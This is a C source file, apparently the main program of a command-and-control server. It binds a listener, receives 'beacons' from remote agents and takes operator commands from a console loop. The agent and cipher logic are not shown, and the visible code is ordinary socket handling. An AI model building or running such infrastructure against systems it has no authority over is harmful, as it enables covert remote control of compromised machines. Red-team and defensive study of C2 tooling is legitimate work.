#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
  #include <winsock2.h>
  #define StdinFd _fileno(stdin)
#else
  #include <sys/select.h>
  #define StdinFd STDIN_FILENO
#endif

#include "core/Cipher.h"
#include "core/Session.h"
#include "core/Network.h"
#include "core/Console.h"

static void ParseArgs(int Argc, char *Argv[], char *Addr, size_t AddrSize, int *Port)
{
    for (int I = 1; I < Argc; I++) {
        if (strcmp(Argv[I], "-s") == 0 && I + 1 < Argc)
            strncpy(Addr, Argv[I + 1], AddrSize - 1);
        if (strcmp(Argv[I], "-p") == 0 && I + 1 < Argc)
            *Port = atoi(Argv[I + 1]);
    }
}

int main(int Argc, char *Argv[])
{
    char BindAddr[64] = "0.0.0.0";
    int  Port         = 8080;

    if (Argc < 5) {
        fprintf(stderr, "Usage: %s -s <host> -p <port>\n", Argv[0]);
        return 1;
    }

    ParseArgs(Argc, Argv, BindAddr, sizeof(BindAddr), &Port);

    if (!NetInit())
        return 1;

    NetSocket Listener = NetCreateListener(BindAddr, Port);
    if (Listener == NetInvalid) {
        NetCleanup();
        return 1;
    }
    NetSetNonBlocking(Listener);

    AgentSession Session;
    SessionInit(&Session);

    printf("C2 Server listening on %s:%d\n", BindAddr, Port);
    printf("C2Main> ");
    fflush(stdout);

    while (1) {
        fd_set ReadSet;
        FD_ZERO(&ReadSet);
        FD_SET(Listener, &ReadSet);
        FD_SET(StdinFd,  &ReadSet);

#ifdef _WIN32
        int MaxFd = 0;
#else
        int MaxFd = Listener > StdinFd ? Listener : StdinFd;
#endif

        struct timeval Timeout = { .tv_sec = 0, .tv_usec = 100000 };

        if (select(MaxFd + 1, &ReadSet, NULL, NULL, &Timeout) < 0)
            continue;

        if (FD_ISSET(Listener, &ReadSet))
            NetHandleBeacon(Listener, &Session);

        if (FD_ISSET(StdinFd, &ReadSet)) {
            char Line[BufferSize] = {0};
            if (!ConsoleReadLine(Line, sizeof(Line)))
                continue;
            if (!ConsoleHandleInput(Line, &Session))
                break;
        }
    }

    NetClose(Listener);
    NetCleanup();
    return 0;
}
